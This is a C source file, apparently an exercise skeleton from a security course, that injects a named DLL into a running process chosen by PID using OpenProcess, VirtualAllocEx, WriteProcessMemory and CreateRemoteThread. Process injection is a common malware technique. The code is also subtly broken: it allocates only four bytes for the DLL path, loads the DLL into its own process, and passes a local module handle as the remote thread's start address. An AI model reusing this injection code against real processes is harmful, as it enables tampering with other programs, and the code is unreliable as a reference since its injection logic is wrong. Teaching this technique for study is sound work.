// Tomer Yehezqel based on Barak Gonen 2019
// Skeleton code - inject DLL to a running process

#include "windows.h"
#include <stdio.h>

#define DLL_TO_INJECT_NAME "8.3.1_First_DLL_Making.dll"
#define BUFFER_SIZE 4096

typedef HMODULE(*P_LIB_FUNC)(CHAR*); //Pointer to Library function in the kernel.
typedef void(*P_SHARE_FUNC)(void); //Pointer to Share function in the dll.

// argv is a given PID to an open process to be "hacked".
int main(INT argc, LPSTR argv[])
{
	if (argc < 2) {
		
		return 0;
	}

	// Get full path of DLL to inject
	CHAR path_buffer[BUFFER_SIZE];

	DWORD pathLen = GetFullPathNameA(DLL_TO_INJECT_NAME,
		BUFFER_SIZE,
		path_buffer,
		NULL);
	
	// Get LoadLibrary function address –
	// the address doesn't change at remote process
	PVOID addrLoadLibrary =
		(PVOID)GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")),
		"LoadLibraryA");
	
	DWORD dwPID = atol(argv[1]); //PID is an input.
	printf("Hello world.");

	// open remote process
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

	// Get a pointer to memory location in remote process,
	// big enough to store DLL path
	PVOID memAddr = (PVOID)VirtualAllocEx(proc, 
		NULL, 
		sizeof(pathLen), 
		MEM_COMMIT, 
		PAGE_READWRITE);

	if (NULL == memAddr) {
		INT err = GetLastError();
		return 0;
	}

	// Write DLL name to remote process memory
	SIZE_T lpNumberOfBytesWritten = 0;
	INT check = WriteProcessMemory(proc,	//Process handle.
		memAddr,							//Process memory address. 
		path_buffer,						//Data written to process memory.
		pathLen,							//Size of data written to the process memory.
		&lpNumberOfBytesWritten);			//Size of the data actually written to the process memory.

	if (0 == check) {
		INT err = GetLastError();
		return 0;
	}

	// Open remote thread, while executing LoadLibrary
	// with parameter DLL name, will trigger DLLMain
	P_LIB_FUNC pDllHandleModule = (P_LIB_FUNC)addrLoadLibrary;	//Make a pointer to LoadLibraryA
	
	HMODULE hDllHandleModule = (*pDllHandleModule)((CHAR*)path_buffer); //Make a module to the dll LoadLibraryA(dll path).

	if (NULL == hDllHandleModule) {
		INT err = GetLastError();
		return 0;
	}

	P_SHARE_FUNC pDllFunction = (P_SHARE_FUNC)GetProcAddress(hDllHandleModule, "Share");
	if (NULL == pDllFunction) {
		INT err = GetLastError();
		return 0;
	}

	HANDLE hRemote = CreateRemoteThread(proc, 
		NULL, 
		NULL, 
		(LPTHREAD_START_ROUTINE)hDllHandleModule ,
		pDllFunction,
		0,
		NULL);

	if (NULL == hRemote) {
		INT err = GetLastError();
		return 0;
	}

	WaitForSingleObject(hRemote, INFINITE);
	check = CloseHandle(hRemote);
	return 1;
}